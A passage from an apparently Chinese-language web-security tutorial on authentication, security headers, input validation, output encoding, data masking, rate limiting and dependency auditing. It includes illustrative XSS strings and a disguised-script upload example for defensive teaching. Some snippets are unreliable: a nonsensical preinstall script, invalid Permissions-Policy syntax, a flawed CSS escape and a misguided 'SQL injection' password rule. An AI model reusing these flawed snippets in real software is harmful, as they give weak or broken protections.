const hash2 = bcrypt.hash("123456", 10); // $2b$10$yyy...（不同！）
```

**其他安全建议**：

```javascript
// 1. 密码强度要求
function validatePassword(password) {
  if (password.length < 8) return "密码至少8位";
  if (!/[A-Z]/.test(password)) return "需包含大写字母";
  if (!/[a-z]/.test(password)) return "需包含小写字母";
  if (!/[0-9]/.test(password)) return "需包含数字";
  return true;
}

// 2. 限制登录尝试次数
const loginAttempts = new Map();

app.post("/login", async (req, res) => {
  const { username } = req.body;
  const attempts = loginAttempts.get(username) || 0;

  if (attempts >= 5) {
    return res.status(429).json({ error: "登录次数过多，请稍后再试" });
  }

  // 验证登录...

  if (failed) {
    loginAttempts.set(username, attempts + 1);
  } else {
    loginAttempts.delete(username);
  }
});

// 3. 多因素认证（MFA）
// 除了密码，还需要手机验证码、邮箱验证码、硬件令牌等
```

---

**本节小结**

认证与授权是 Web 安全的重要组成部分：

| 机制 | 说明 |
|------|------|
| Session | 服务端存储，需共享存储 |
| Token | 无状态，易扩展 |
| JWT | 包含 Header/Payload/Signature 三部分 |
| bcrypt | 密码哈希，自带盐 |
| 双 Token | Access Token + Refresh Token |

## 38.9 安全响应头

### 38.9.1 X-Content-Type-Options：防止 MIME 类型嗅探

**X-Content-Type-Options** 响应头告诉浏览器：**不要猜测内容类型，严格按照服务器声明的 MIME 类型处理**。

```javascript
// 设置响应头
res.setHeader("X-Content-Type-Options", "nosniff");
```

```nginx
# Nginx 配置
add_header X-Content-Type-Options "nosniff" always;
```

```apache
# Apache 配置
Header always set X-Content-Type-Options "nosniff"
```

**为什么需要这个头？**

```mermaid
graph LR
    A["上传图片功能"] -->|"上传evil.jpg<br/>(实际是JavaScript)"| B["服务器"]
    B -->|"Content-Type:image/jpeg"| C["浏览器"]
    C -->|"嗅探文件内容<br/>发现是JS"| D["执行为JavaScript!"]
    D --> E["XSS 攻击！"]
    style E fill:#ff6b6b
```

**没有这个头时**：

```html
<!-- 攻击者上传一个名为 evil.jpg 的文件 -->
<!-- 文件内容实际上是 JavaScript -->
<script src="https://forum.com/uploads/evil.jpg"></script>

<!-- 浏览器可能不理会 Content-Type -->
<!-- 直接执行脚本！ -->
```

**有这个头后**：

```javascript
// 浏览器严格遵守 Content-Type
// 如果服务器说是图片，就当图片处理，不会执行
// <script> 标签引用图片 URL 无效
```

---

### 38.9.2 X-XSS-Protection：浏览器 XSS 过滤器（已被 CSP 取代）

**X-XSS-Protection** 是旧版浏览器内置的 XSS 过滤器，现在基本已被 CSP 取代。

```javascript
// 设置响应头
res.setHeader("X-XSS-Protection", "1; mode=block");
```

**参数说明**：

| 值 | 行为 |
|----|------|
| 0 | 禁用 XSS 过滤器 |
| 1 | 启用 XSS 过滤器 |
| 1; mode=block | 启用并阻止页面渲染（推荐） |
| 1; report=<uri> | 启用并报告违规（Chromium） |

**局限性**：

```javascript
// X-XSS-Protection 只能防御简单的反射型 XSS
// 无法防御存储型 XSS、DOM 型 XSS
// 现代浏览器推荐使用 CSP 代替
```

---

### 38.9.3 Content-Security-Policy（CSP）：白名单机制，防止 XSS 和数据注入

**CSP** 是最重要的安全响应头之一，它通过白名单机制告诉浏览器：**哪些外部资源可以加载/执行**。

```javascript
// 设置 CSP 响应头
res.setHeader("Content-Security-Policy", "default-src 'self'");
```

```html
<!-- 也可以用 Meta 标签 -->
<!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> -->
```

**常见 CSP 指令**：

| 指令 | 说明 |
|------|------|
| default-src | 默认来源 |
| script-src | 脚本来源 |
| style-src | 样式来源 |
| img-src | 图片来源 |
| connect-src | AJAX/Fetch/WebSocket 来源 |
| font-src | 字体来源 |
| frame-src | iframe 来源 |
| report-uri | 违规报告地址 |

**CSP 指令值**：

| 值 | 说明 |
|----|------|
| 'self' | 仅同源 |
| 'none' | 禁止 |
| 'unsafe-inline' | 允许内联脚本/样式（不安全） |
| 'unsafe-eval' | 允许 eval（不安全） |
| https://example.com | 仅允许指定域名 |
| *.example.com | 允许子域名 |

**CSP 配置示例**：

```javascript
// 严格配置
const strictCSP = [
  "default-src 'self'",
  "script-src 'self'", // 只允许同源脚本
  "style-src 'self' 'unsafe-inline'", // 允许内联样式（有时必需）
  "img-src 'self' https://images.example.com",
  "connect-src 'self' https://api.example.com",
  "frame-ancestors 'self'", // 防止点击劫持
  "form-action 'self'" // 表单只能提交到同源
].join("; ");

res.setHeader("Content-Security-Policy", strictCSP);
```

**报告违规**：

```javascript
// 配置违规报告
res.setHeader("Content-Security-Policy", [
  "default-src 'self'",
  "report-uri /csp-violation-report"
].join("; "));

// 格式
// POST /csp-violation-report
// Content-Type: application/csp-report
{
  "csp-report": {
    "document-uri": "https://mysite.com/page",
    "referrer": "",
    "blocked-uri": "https://evil.com/malicious.js",
    "violated-directive": "script-src 'self'",
    "original-policy": "default-src 'self'; script-src 'self'"
  }
}
```

**CSP 防御 XSS 原理图**：

```mermaid
graph TD
    A["XSS 注入"] -->|"<script>alert('xss')</script>"| B["浏览器加载页面"]
    B -->|"查询 CSP"| C{"script-src 允许?"}
    C -->|"不允许"| D["阻止执行"]
    C -->|"允许"| E["执行脚本<br/>(可能是攻击)"]
    style D fill:#98d8c8
    style E fill:#ff6b6b
```

---

### 38.9.4 X-Frame-Options：防止点击劫持

```javascript
// 设置响应头
res.setHeader("X-Frame-Options", "DENY");
// 或
res.setHeader("X-Frame-Options", "SAMEORIGIN");
```

| 值 | 说明 |
|----|------|
| DENY | 完全禁止被嵌入 |
| SAMEORIGIN | 仅允许同源页面嵌入 |

---

### 38.9.5 Referrer-Policy：控制 Referer 头信息的发送

**Referrer-Policy** 控制浏览器发送 Referer 头的方式，防止敏感 URL 泄露。

```javascript
res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
```

**可选值**：

| 值 | 说明 |
|----|------|
| no-referrer | 不发送 Referer |
| no-referrer-when-downgrade | 同协议或升级时发送（默认） |
| origin | 只发送来源域名 |
| origin-when-cross-origin | 跨域时只发送域名 |
| same-origin | 仅同源时发送 |
| strict-origin | 仅 HTTPS→HTTPS 时发送域名 |
| strict-origin-when-cross-origin | 跨域时只发送域名（HTTPS→HTTPS） |
| unsafe-url | 始终发送完整 URL（不安全） |

**场景示例**：

```javascript
// 敏感 URL 不应该泄露
// https://bank.com/transfer?to=hacker&amount=10000

// 设置 strict-origin 后
// Referer: https://bank.com
// （只发送域名，不发送完整路径）
```

---

### 38.9.6 Permissions-Policy：控制浏览器功能 API 的使用权限

**Permissions-Policy**（原 Feature-Policy）控制页面可以使用哪些浏览器 API。

```javascript
res.setHeader("Permissions-Policy", "geolocation=(), camera=(), microphone=()");
```

**常见策略**：

| 功能 | 说明 |
|------|------|
| geolocation | 地理位置 |
| camera | 摄像头 |
| microphone | 麦克风 |
| usb | USB 设备 |
| payment | 支付 API |
| fullscreen | 全屏 API |

**示例**：

```javascript
// 完全禁用摄像头和麦克风
res.setHeader("Permissions-Policy", "camera=none; microphone=none");

// 仅允许同源 iframe 使用地理位置
res.setHeader("Permissions-Policy", "geolocation=(self)");

// 禁止所有敏感 API
const disableAll = [
  "camera=()",
  "microphone=()",
  "geolocation=()",
  "usb=()",
  "payment=()"
].join(", ");

res.setHeader("Permissions-Policy", disableAll);
```

---

**安全响应头汇总**：

```javascript
// 一次性设置所有安全响应头
app.use((req, res, next) => {
  // 防止 MIME 类型嗅探
  res.setHeader("X-Content-Type-Options", "nosniff");

  // XSS 过滤器（已被 CSP 取代，但旧浏览器仍需要）
  res.setHeader("X-XSS-Protection", "1; mode=block");

  // 内容安全策略
  res.setHeader("Content-Security-Policy", "default-src 'self'");

  // 防止点击劫持
  res.setHeader("X-Frame-Options", "DENY");

  // Referrer 策略
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

  // 权限策略
  res.setHeader("Permissions-Policy", "geolocation=(), camera=(), microphone=()");

  next();
});
```

---

**本节小结**

安全响应头是服务端配置的安全屏障：

| 响应头 | 作用 |
|-------|------|
| X-Content-Type-Options | 防止 MIME 嗅探 |
| X-XSS-Protection | XSS 过滤器（已被 CSP 取代） |
| Content-Security-Policy | CSP 白名单 |
| X-Frame-Options | 防止点击劫持 |
| Referrer-Policy | 控制 Referer 发送 |
| Permissions-Policy | 控制浏览器 API 权限 |

## 38.10 前端安全最佳实践

### 38.10.1 输入验证：客户端验证不可靠，服务端必须二次校验

**客户端验证只是用户体验优化，服务端验证才是真正的安全保障！**

```mermaid
graph LR
    A["客户端"] -->|"1. 基本验证|格式、长度"| B["用户体验好"]
    A2["攻击者"] -->|"2. 绕过客户端|直接发请求"| C["服务端必须再验证"]
    style A2 fill:#ff6b6b
```

**客户端验证（可被绕过）**：

```javascript
// 客户端验证：用户体验优化
function validateForm(form) {
  const email = form.email.value;
  const password = form.password.value;

  if (!email.includes("@")) {
    alert("邮箱格式不正确");
    return false;
  }

  if (password.length < 8) {
    alert("密码至少8位");
    return false;
  }

  return true;
}

// 问题：攻击者可以绕过这个验证
// 直接用 curl 或 Postman 发送请求！
```

**服务端验证（必须）**：

```javascript
// 服务端验证：真正的安全保障
app.post("/register", async (req, res) => {
  const { email, password } = req.body;

  // 1. 格式验证
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ error: "邮箱格式不正确" });
  }

  // 2. 长度验证
  if (password.length < 8 || password.length > 128) {
    return res.status(400).json({ error: "密码长度应在 8-128 位之间" });
  }

  // 3. 强度验证
  if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/.test(password)) {
    return res.status(400).json({ error: "密码需包含大小写字母和数字" });
  }

  // 4. SQL 注入验证
  if (/['";"]/.test(password)) {
    return res.status(400).json({ error: "密码包含非法字符" });
  }

  // 5. 检查邮箱是否已注册
  const existing = await db.users.findOne({ email });
  if (existing) {
    return res.status(409).json({ error: "邮箱已被注册" });
  }

  // 验证通过，存储用户
  const hashedPassword = await bcrypt.hash(password, 10);
  await db.users.insert({ email, password: hashedPassword });

  res.json({ success: true });
});
```

---

### 38.10.2 输出编码：不同场景使用不同的编码方式（HTML / URL / JavaScript / CSS）

**输出编码是防止 XSS 的关键！不同上下文要用不同的编码方式。**

```javascript
// HTML 上下文：转义 HTML 特殊字符
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;");
}

// 用户输入被当作 HTML 显示时
const safeContent = escapeHtml(userInput);
element.innerHTML = `<p>${safeContent}</p>`;
```

```javascript
// JavaScript 上下文：转义 JavaScript 特殊字符
function escapeJs(str) {
  return str
    .replace(/\\/g, "\\\\") // 反斜杠放最前面
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/\t/g, "\\t");
}

// 在 script 标签中插入用户数据
// 危险：content = "hello'; alert('xss'); //"
// 安全：
const safeContent = escapeJs(userContent);
script.textContent = `var data = '${safeContent}'`;
```

```javascript
// URL 上下文：编码 URL 参数
function escapeUrl(str) {
  return encodeURIComponent(str)
    .replace(/!/g, "%21")
    .replace(/'/g, "%27")
    .replace(/\(/g, "%28")
    .replace(/\)/g, "%29");
}

// 用户输入作为 URL 参数
const safeParam = escapeUrl(userInput);
const link = `<a href="/search?q=${safeParam}">搜索</a>`;
```

```javascript
// CSS 上下文：编码 CSS 内容
function escapeCss(str) {
  return str.replace(/[<>"'()]/g, char => `\\${char.charCodeAt(0).toString(16)}`);
}

// 用户输入作为 CSS 属性值
element.style.background = `url(${escapeCss(userInput)})`;
```

**不同上下文编码总结**：

```mermaid
graph TD
    A["用户输入"] --> B{"输出上下文"}
    B -->|"HTML"| C["escapeHtml()"]
    B -->|"JavaScript"| D["escapeJs()"]
    B -->|"URL"| E["encodeURIComponent()"]
    B -->|"CSS"| F["escapeCss()"]
    B -->|"Attribute"| G["escapeHtml() + 转义引号"]
    style C fill:#98d8c8
    style D fill:#98d8c8
    style E fill:#98d8c8
    style F fill:#98d8c8
    style G fill:#98d8c8
```

---

### 38.10.3 敏感数据脱敏：手机号 / 身份证号 / 银行卡号

```javascript
// 手机号脱敏：138****8888
function maskPhone(phone) {
  if (!phone || phone.length !== 11) return phone;
  return phone.replace(/(\d{3})\d{4}(\d{4})/, "$1****$2");
}

console.log(maskPhone("13812345678")); // 138****5678
```

```javascript
// 身份证号脱敏：110***********1234
function maskIdCard(idCard) {
  if (!idCard || idCard.length < 10) return idCard;
  return idCard.replace(/(\d{3})\d{11}(\d{4})/, "$1***********$2");
}

console.log(maskIdCard("110101199001011234")); // 110***********1234
```

```javascript
// 银行卡号脱敏：**** **** **** 1234
function maskBankCard(cardNumber) {
  if (!cardNumber) return cardNumber;
  // 移除空格
  const clean = cardNumber.replace(/\s/g, "");
  // 显示最后4位
  return "**** **** **** " + clean.slice(-4);
}

console.log(maskBankCard("6222 1234 5678 9012")); // **** **** **** 9012
```

```javascript
// 邮箱脱敏：t***@example.com
function maskEmail(email) {
  if (!email || !email.includes("@")) return email;
  const [name, domain] = email.split("@");
  if (name.length <= 2) {
    return name[0] + "***@" + domain;
  }
  return name[0] + "***" + name.slice(-1) + "@" + domain;
}

console.log(maskEmail("zhangsan@example.com")); // z***n@example.com
console.log(maskEmail("ab@example.com")); // a***@example.com
```

---

### 38.10.4 接口防刷：请求频率限制 / 验证码

**接口防刷是防止恶意请求和 DDoS 的重要手段。**

```javascript
// 使用 express-rate-limit
const rateLimit = require("express-rate-limit");

// 通用限流：每分钟 100 次
const generalLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 分钟
  max: 100, // 每分钟最多 100 次
  message: "请求过于频繁，请稍后再试",
  standardHeaders: true, // 返回 RateLimit-* 头
  legacyHeaders: false
});

// 登录限流：每分钟 5 次
const loginLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true, // 只计算失败的请求
  message: "登录尝试次数过多，请 1 分钟后再试"
});

// 验证码限流
const captchaLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  message: "验证码请求过于频繁"
});

// 应用中间件
app.use("/api/", generalLimiter);
app.post("/login", loginLimiter);
app.post("/captcha", captchaLimiter);
```

```javascript
// 自定义限流实现
const requestCounts = new Map();
const WINDOW_MS = 60 * 1000; // 1 分钟窗口
const MAX_REQUESTS = 100;

function customRateLimiter(req, res, next) {
  const ip = req.ip;
  const now = Date.now();

  // 初始化或重置计数
  if (!requestCounts.has(ip)) {
    requestCounts.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    return next();
  }

  const record = requestCounts.get(ip);

  // 窗口过期，重置
  if (now > record.resetTime) {
    record.count = 1;
    record.resetTime = now + WINDOW_MS;
    return next();
  }

  // 检查是否超限
  if (record.count >= MAX_REQUESTS) {
    return res.status(429).json({
      error: "请求过于频繁",
      retryAfter: Math.ceil((record.resetTime - now) / 1000)
    });
  }

  record.count++;
  next();
}
```

---

### 38.10.5 错误信息脱敏：生产环境不暴露堆栈信息

```javascript
// 生产环境隐藏错误详情
app.use((err, req, res, next) => {
  // 记录详细错误日志（服务器端）
  console.error("错误详情：", {
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip,
    timestamp: new Date().toISOString()
  });

  // 判断是否为开发环境
  if (process.env.NODE_ENV === "development") {
    // 开发环境返回详细错误
    res.status(err.status || 500).json({
      error: err.message,
      stack: err.stack
    });
  } else {
    // 生产环境只返回通用错误
    res.status(err.status || 500).json({
      error: "服务器内部错误，请稍后再试"
    });
  }
});
```

```javascript
// 全局错误处理
process.on("uncaughtException", (err) => {
  // 记录错误日志
  logger.error("未捕获的异常", { error: err.message, stack: err.stack });

  // 优雅退出
  process.exit(1);
});

process.on("unhandledRejection", (reason, promise) => {
  logger.error("未处理的 Promise 拒绝", { reason, promise });
});
```

---

### 38.10.6 前端日志监控：Sentry 错误上报

```javascript
// Sentry 集成
const Sentry = require("@sentry/node");
const Tracing = require("@sentry/tracing");

Sentry.init({
  dsn: "https://xxxxx@sentry.io/xxxxx",
  environment: process.env.NODE_ENV,
  integrations: [
    new Sentry.Integrations.Http({ tracing: true }),
    new Tracing.Integrations.Express()
  ]
});

// Express 中间件
app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// 在错误处理中使用
app.use((err, req, res, next) => {
  Sentry.captureException(err);

  if (process.env.NODE_ENV === "production") {
    res.status(500).json({ error: "服务器错误" });
  } else {
    res.status(500).json({ error: err.message });
  }
});

// 前端 Sentry 集成
// <script src="https://browser.sentry-cdn.com/xxx/latest.js"></script>
Sentry.init({
  dsn: "https://xxxxx@sentry.io/xxxxx",
  integrations: [new Sentry.Integrations.Vue({ Vue })],
  environment: "production"
});

// 手动上报错误
try {
  // 业务代码
} catch (err) {
  Sentry.captureException(err);
  throw err;
}
```

---

### 38.10.7 依赖安全：定期检查 npm 依赖的已知漏洞（npm audit / Snyk）

```bash
# 定期运行 npm audit
npm audit

# 自动修复漏洞
npm audit fix

# 查看详细报告
npm audit --audit-level=high

# 安装审计工具
npm install -g npm-check-updates
ncu  # 检查可更新的包
```

```javascript
// package.json 配置 audit
{
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "preinstall": "npx force-resolve --override '">=4.17.21 <4.17.21'"
  }
}
```

```json
// .snyk 配置文件
{
  "org": "your-org",
  "policy": {
    "ignore": [
      {
        "id": "npm:lodash:20210101",
        "reason": "Waiting for patch to be released",
        "expires": "2021-06-01"
      }
    ]
  }
}
```

```bash
# 使用 Snyk 持续监控
npm install -g snyk
snyk auth
snyk monitor

# GitHub Actions 集成
# .github/workflows/security.yml
name: Security

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 0 * * *'

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

**本章小结**

前端安全最佳实践汇总：

| 实践 | 说明 |
|------|------|
| 输入验证 | 客户端+服务端双重验证 |
| 输出编码 | 根据上下文选择合适的编码方式 |
| 敏感数据脱敏 | 手机号、身份证、银行卡等 |
| 接口防刷 | 限流、验证码 |
| 错误信息脱敏 | 生产环境不暴露堆栈 |
| 日志监控 | Sentry 等错误追踪工具 |
| 依赖安全 | 定期 audit，使用 Snyk |

**安全是一个系统工程，需要前后端共同努力！**

